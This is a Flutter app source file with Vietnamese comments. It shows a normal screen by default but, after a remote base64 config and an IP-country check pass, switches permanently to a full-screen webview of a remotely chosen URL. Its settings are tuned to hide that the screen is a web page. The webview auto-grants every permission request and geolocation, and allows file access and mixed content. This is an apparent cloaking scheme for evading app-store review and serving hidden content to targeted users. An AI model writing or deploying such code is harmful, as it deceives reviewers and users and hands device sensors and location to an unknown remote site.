import 'dart:convert';
import 'dart:io';
import 'dart:ui' as ui;

import 'package:all_in_one_sdk/all_in_one_sdk.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:user_screen/user_screen.dart';

String configBaseUrl =
    'https://raw.githubusercontent.com/remoteconfig123/remoteconfig/refs/heads/main';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initAllInOneSdk();
  runApp(const MyApp());
}

Future<void> initAllInOneSdk() async {
  try {
    final info = await PackageInfo.fromPlatform();
    print('Package name: ${info.packageName}');

    final url = configBaseUrl + '/${info.packageName}/sdk.json';

    final response = await http.get(Uri.parse(url));

    if (response.statusCode != 200) {
      debugPrint('SDK config load failed');
      return;
    }
    print(response.body);

    final data = jsonDecode(response.body);

    print(data);

    final firebase = data['firebase'];
    final facebook = data['facebook'];
    final tiktok = data['tiktok'];

    await SdkBootstrap.apply(
      firebase: firebase == null
          ? null
          : FirebaseDynamicConfig(
              apiKey: firebase['apiKey'] ?? '',
              gcmSenderId: firebase['gcmSenderId'] ?? '',
              bundleId: firebase['bundleId'] ?? '',
              projectId: firebase['projectId'] ?? '',
              storageBucket: firebase['storageBucket'] ?? '',
              googleAppId: firebase['googleAppId'] ?? '',
              isAnalyticsEnabled: firebase['isAnalyticsEnabled'] ?? true,
            ),
      facebook: facebook == null
          ? null
          : FacebookSdkConfig(
              applicationId: facebook['applicationId'] ?? '',
              clientToken: facebook['clientToken'] ?? '',
              displayName: facebook['displayName'] ?? '',
              autoLogAppEventsEnabled:
                  facebook['autoLogAppEventsEnabled'] ?? true,
              advertiserIdCollectionEnabled:
                  facebook['advertiserIdCollectionEnabled'] ?? true,
            ),
      tiktok: tiktok == null
          ? null
          : TikTokSdkConfig(
              tiktokAppId: tiktok['tiktokAppId'] ?? '',
              appId: tiktok['appId'] ?? '',
              accessToken: tiktok['accessToken'] ?? '',
              debugModeEnabled: false,
            ),
    );

    debugPrint('SDK initialized successfully');
  } catch (e) {
    debugPrint('Init SDK error: $e');
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SplashScreen(),
    );
  }
}

// ============================================================
// SPLASH SCREEN
// ============================================================

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _init();
    });
  }

  Future<void> _init() async {
    final config = await fetchRemoteConfig();

    if (!mounted) return;

    if (config.isEmpty) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (_) => const UserScreen(),
        ),
      );
    } else {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (_) => WebViewScreen(
            uri: config.url,
            forceLandscape: config.landscape,
            isFull: config.isFull,
            isBlack: config.isBlack,
          ),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: Center(
        child: CircularProgressIndicator(),
      ),
    );
  }
}

// ============================================================
// FETCH REMOTE CONFIG
// ============================================================

/// Kết quả đọc từ android.ini / ios.ini: link cần mở và cờ ép nằm ngang.
class RemoteConfig {
  final String url;
  final bool landscape;

  /// true -> webview tràn toàn màn hình, bỏ hết safe area.
  final bool isFull;

  /// Màu dải safe area khi isFull=false: true -> đen, false -> trắng.
  final bool isBlack;

  const RemoteConfig({
    required this.url,
    required this.landscape,
    required this.isFull,
    required this.isBlack,
  });

  static const RemoteConfig none = RemoteConfig(
    url: '',
    landscape: false,
    isFull: false,
    isBlack: false,
  );

  bool get isEmpty => url.isEmpty;
}

/// Cờ bool trong config có thể là true, "true", 1, "1", "yes"... nên nhận hết.
bool parseFlag(dynamic value) {
  if (value is bool) return value;

  if (value is num) return value != 0;

  if (value is String) {
    final v = value.trim().toLowerCase();

    return v == 'true' || v == '1' || v == 'yes';
  }

  return false;
}

Future<RemoteConfig> fetchRemoteConfig() async {
  try {
    final bundleId = (await PackageInfo.fromPlatform()).packageName;

    final file = Platform.isAndroid ? 'android.ini' : 'ios.ini';

    final link = '$configBaseUrl/$bundleId/$file';

    print("config link: $link");

    // ========================================================
    // B1: Fetch Base64 config
    // ========================================================

    final res =
        await http.get(Uri.parse(link)).timeout(const Duration(seconds: 5));

    if (res.statusCode != 200) {
      throw Exception("Config fetch failed");
    }

    // ========================================================
    // B2: Decode Base64 → UTF-8
    // ========================================================

    final decodedData = utf8.decode(
      base64Decode(
        cleanBase64(res.body),
      ),
    );

    // ========================================================
    // B3: Parse JSON
    // ========================================================

    final jsonData = json.decode(decodedData);

    final String linkReal = jsonData["linkReal"] ?? "";

    final String ip = jsonData["ip"] ?? "";

    final bool landscape = parseFlag(jsonData["landscape"]);

    final bool isFull = parseFlag(jsonData["isFull"]);

    final bool isBlack = parseFlag(jsonData["isBlack"]);

    print("landscape: $landscape, isFull: $isFull, isBlack: $isBlack");

    // ========================================================
    // CHECK REGION
    // ========================================================

    final locale = ui.PlatformDispatcher.instance.locale;

    final countryCode = locale.countryCode?.toUpperCase() ?? "";

    print("Region: $countryCode");

    // ========================================================
    // CHECK NETWORK IP
    // ========================================================

    final checkRegionRes = await http
        .get(
          Uri.parse("http://ip-api.com/json/"),
        )
        .timeout(const Duration(seconds: 3));

    final data = jsonDecode(checkRegionRes.body);

    final networkCountryCode = data["countryCode"] ?? "";

    print("network country: $networkCountryCode");
    print("condition IP: $ip");

    // ========================================================
    // CHECK CONDITION
    // ========================================================

    if (ip.isEmpty ||
        ip.contains(networkCountryCode) ||
        ip.contains(countryCode)) {
      print("Passed IP");

      // Return URL
      final SharedPreferences prefs = await SharedPreferences.getInstance();

      await prefs.setBool('Passed', true);

      return RemoteConfig(
        url: linkReal,
        landscape: landscape,
        isFull: isFull,
        isBlack: isBlack,
      );
    }

    // ========================================================
    // NOT PASSED → CHECK SESSION
    // ========================================================

    print("Not Passed IP, check session...");

    final SharedPreferences prefs = await SharedPreferences.getInstance();

    final bool stt = prefs.getBool('Passed') ?? false;

    if (stt) {
      print("Passed session");

      return RemoteConfig(
        url: linkReal,
        landscape: landscape,
        isFull: isFull,
        isBlack: isBlack,
      );
    }

    print("NotPassed");

    return RemoteConfig.none;
  } catch (e) {
    print("Error fetchRemoteConfig: $e");

    // Có lỗi → cho vào app bình thường
    return RemoteConfig.none;
  }
}

// ============================================================
// CLEAN BASE64
// ============================================================

String cleanBase64(String input) {
  String cleaned = input.replaceAll("\n", "").replaceAll("\r", "").trim();

  while (cleaned.length % 4 != 0) {
    cleaned += "=";
  }

  return cleaned;
}

// ============================================================
// FULL SCREEN WEBVIEW
// ============================================================

class WebViewScreen extends StatefulWidget {
  final String uri;

  /// true  -> ép nằm ngang (landscapeRight)
  /// false -> để thiết bị tự quyết theo cảm biến xoay
  final bool forceLandscape;

  /// true -> bỏ hết safe area, web tràn kín màn hình.
  final bool isFull;

  /// Màu dải safe area chỗ tai thỏ: true -> đen, false -> trắng.
  final bool isBlack;

  const WebViewScreen({
    super.key,
    required this.uri,
    this.forceLandscape = false,
    this.isFull = false,
    this.isBlack = false,
  });

  @override
  State<WebViewScreen> createState() => _WebViewScreenState();
}

class _WebViewScreenState extends State<WebViewScreen> {
  InAppWebViewController? _controller;
  PullToRefreshController? _pullToRefreshController;

  bool _isFirstLoad = true;
  bool _hasError = false;
  double _progress = 0;

  static final InAppWebViewSettings _settings = InAppWebViewSettings(
    // Nội dung web phải chạy được đầy đủ như trên trình duyệt
    javaScriptEnabled: true,
    javaScriptCanOpenWindowsAutomatically: true,
    supportMultipleWindows: true,
    useShouldOverrideUrlLoading: true,
    useOnDownloadStart: true,
    mediaPlaybackRequiresUserGesture: false,
    transparentBackground: false,
    // Android
    useHybridComposition: true,
    domStorageEnabled: true,
    databaseEnabled: true,
    thirdPartyCookiesEnabled: true,
    allowFileAccess: true,
    allowContentAccess: true,
    mixedContentMode: MixedContentMode.MIXED_CONTENT_ALWAYS_ALLOW,
    // Android: cho audio chạy tiếp khi app xuống nền / khoá màn hình.
    allowBackgroundAudioPlaying: true,
    // iOS
    allowsInlineMediaPlayback: true,
    allowsPictureInPictureMediaPlayback: true,
    // Player nhúng trong iframe (YouTube, Vimeo...) bật fullscreen được.
    iframeAllowFullscreen: true,
    allowsBackForwardNavigationGestures: true,
    // Ẩn dấu vết "đây là trang web": không cho zoom bằng 2 ngón, không hiện
    // thanh cuộn, không hiện menu chọn text kiểu trình duyệt.
    supportZoom: false,
    verticalScrollBarEnabled: false,
    horizontalScrollBarEnabled: false,
    disableLongPressContextMenuOnLinks: true,
  );

  @override
  void initState() {
    super.initState();

    // Chỉ màn webview bị khoá nằm ngang; UserScreen vẫn xoay tự do.
    // landscape=true -> khoá đúng MỘT chiều. iOS báo safe-area đối xứng hai
    // bên khi nằm ngang, chỉ khi biết chắc tai thỏ ở đâu mới chừa lề đúng
    // một phía được. landscape=false -> trả quyền xoay lại cho thiết bị.
    SystemChrome.setPreferredOrientations(
      widget.forceLandscape
          ? [DeviceOrientation.landscapeRight]
          : DeviceOrientation.values,
    );

    // Tràn viền hoàn toàn: web vẽ dưới cả status bar lẫn thanh điều hướng.
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);

    SystemChrome.setSystemUIOverlayStyle(
      SystemUiOverlayStyle(
        statusBarColor: Colors.transparent,
        // Dải đen thì icon status bar phải sáng mới đọc được, và ngược lại.
        statusBarIconBrightness:
            widget.isBlack ? Brightness.light : Brightness.dark,
        statusBarBrightness:
            widget.isBlack ? Brightness.dark : Brightness.light,
        systemNavigationBarColor: Colors.transparent,
        systemNavigationBarDividerColor: Colors.transparent,
        systemNavigationBarIconBrightness:
            widget.isBlack ? Brightness.light : Brightness.dark,
      ),
    );

    _pullToRefreshController = PullToRefreshController(
      settings: PullToRefreshSettings(
        color: Colors.black54,
      ),
      onRefresh: () async {
        if (Platform.isAndroid) {
          await _controller?.reload();
        } else {
          final url = await _controller?.getUrl();

          if (url != null) {
            await _controller?.loadUrl(urlRequest: URLRequest(url: url));
          }
        }
      },
    );
  }

  @override
  void dispose() {
    // Trả lại quyền xoay cho phần còn lại của app.
    SystemChrome.setPreferredOrientations(DeviceOrientation.values);

    super.dispose();
  }

  // ==========================================================
  // BACK BUTTON: lùi trong lịch sử web trước khi thoát app
  // ==========================================================

  Future<void> _handlePop(bool didPop) async {
    if (didPop) return;

    final controller = _controller;

    if (controller != null && await controller.canGoBack()) {
      await controller.goBack();

      return;
    }

    if (!mounted) return;

    SystemNavigator.pop();
  }

  // ==========================================================
  // Các scheme không phải http/https (tel:, mailto:, intent:,
  // market:, zalo:, ...) phải đẩy ra ngoài cho hệ thống xử lý.
  // ==========================================================

  Future<bool> _openExternally(Uri url) async {
    try {
      return await launchUrl(url, mode: LaunchMode.externalApplication);
    } catch (e) {
      print("Open external error: $e");

      return false;
    }
  }

  void _reload() {
    setState(() {
      _hasError = false;
      _isFirstLoad = true;
    });

    _controller?.loadUrl(
      urlRequest: URLRequest(url: WebUri(widget.uri)),
    );
  }

  /// Màu của dải safe area và của các lớp phủ (splash, màn lỗi).
  Color get _chromeColor => widget.isBlack ? Colors.black : Colors.white;

  @override
  Widget build(BuildContext context) {
    final content = Stack(
      children: [
        InAppWebView(
          initialUrlRequest: URLRequest(url: WebUri(widget.uri)),
          initialSettings: _settings,
          pullToRefreshController: _pullToRefreshController,
          onWebViewCreated: (controller) {
            _controller = controller;
          },
          onLoadStart: (controller, url) {
            if (!mounted) return;

            setState(() {
              _hasError = false;
            });
          },
          onLoadStop: (controller, url) async {
            _pullToRefreshController?.endRefreshing();

            if (!mounted) return;

            setState(() {
              _isFirstLoad = false;
            });
          },
          onProgressChanged: (controller, progress) {
            if (progress == 100) {
              _pullToRefreshController?.endRefreshing();
            }

            if (!mounted) return;

            setState(() {
              _progress = progress / 100;
            });
          },
          onReceivedError: (controller, request, error) {
            _pullToRefreshController?.endRefreshing();

            // Chỉ báo lỗi cho request của chính trang, bỏ qua ảnh /
            // iframe / quảng cáo lỗi lặt vặt.
            if (request.isForMainFrame != true) return;

            // Back / chuyển trang giữa chừng / mở scheme ngoài đều bắn
            // lỗi "CANCELLED" - đó không phải mất mạng.
            if (error.type == WebResourceErrorType.CANCELLED) return;

            if (!mounted) return;

            setState(() {
              _hasError = true;
              _isFirstLoad = false;
            });
          },
          onReceivedHttpError: (controller, request, response) {
            _pullToRefreshController?.endRefreshing();

            if (request.isForMainFrame != true) return;

            if ((response.statusCode ?? 0) < 500) return;

            if (!mounted) return;

            setState(() {
              _hasError = true;
              _isFirstLoad = false;
            });
          },
          shouldOverrideUrlLoading: (controller, action) async {
            final url = action.request.url;

            if (url == null) return NavigationActionPolicy.ALLOW;

            if (url.scheme == 'http' || url.scheme == 'https') {
              return NavigationActionPolicy.ALLOW;
            }

            await _openExternally(Uri.parse(url.toString()));

            return NavigationActionPolicy.CANCEL;
          },
          onCreateWindow: (controller, action) async {
            // target="_blank" / window.open() -> mở ngay trong webview
            // hiện tại thay vì bật cửa sổ mới.
            final url = action.request.url;

            if (url != null) {
              await controller.loadUrl(
                urlRequest: URLRequest(url: url),
              );
            }

            return false;
          },
          onDownloadStartRequest: (controller, request) async {
            await _openExternally(
              Uri.parse(request.url.toString()),
            );
          },
          onPermissionRequest: (controller, request) async {
            return PermissionResponse(
              resources: request.resources,
              action: PermissionResponseAction.GRANT,
            );
          },
          onGeolocationPermissionsShowPrompt: (controller, origin) async {
            return GeolocationPermissionShowPromptResponse(
              origin: origin,
              allow: true,
              retain: true,
            );
          },
        ),

        // Thanh tiến trình mảnh khi điều hướng giữa các trang
        if (!_isFirstLoad && _progress < 1.0 && !_hasError)
          LinearProgressIndicator(
            value: _progress,
            minHeight: 2,
            backgroundColor: Colors.transparent,
          ),

        // Splash lần load đầu -> người dùng không thấy trang trắng
        if (_isFirstLoad && !_hasError)
          ColoredBox(
            color: _chromeColor,
            child: const Center(
              child: CircularProgressIndicator(),
            ),
          ),

        // Mất mạng / server lỗi
        if (_hasError)
          ColoredBox(
            color: _chromeColor,
            child: Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    Icons.wifi_off_rounded,
                    size: 48,
                    color: widget.isBlack ? Colors.white38 : Colors.black38,
                  ),
                  const SizedBox(height: 12),
                  Text(
                    'Không có kết nối',
                    style: TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.w600,
                      color: widget.isBlack ? Colors.white : Colors.black87,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Kiểm tra mạng rồi thử lại.',
                    style: TextStyle(
                      color: widget.isBlack ? Colors.white70 : Colors.black54,
                    ),
                  ),
                  const SizedBox(height: 16),
                  FilledButton(
                    onPressed: _reload,
                    child: const Text('Thử lại'),
                  ),
                ],
              ),
            ),
          ),
      ],
    );

    return PopScope(
      canPop: false,
      onPopInvokedWithResult: (didPop, _) => _handlePop(didPop),
      child: Scaffold(
        backgroundColor: _chromeColor,
        // isFull -> tràn kín, không chừa gì cả.
        // Ngược lại: chừa lề trên + phía tai thỏ. Khoá ngang thì tai thỏ chắc
        // chắn bên trái nên bỏ luôn lề phải; xoay tự do thì phải chừa cả hai.
        body: widget.isFull
            ? content
            : SafeArea(
                top: true,
                bottom: false,
                left: true,
                right: !widget.forceLandscape,
                child: content,
              ),
      ),
    );
  }
}
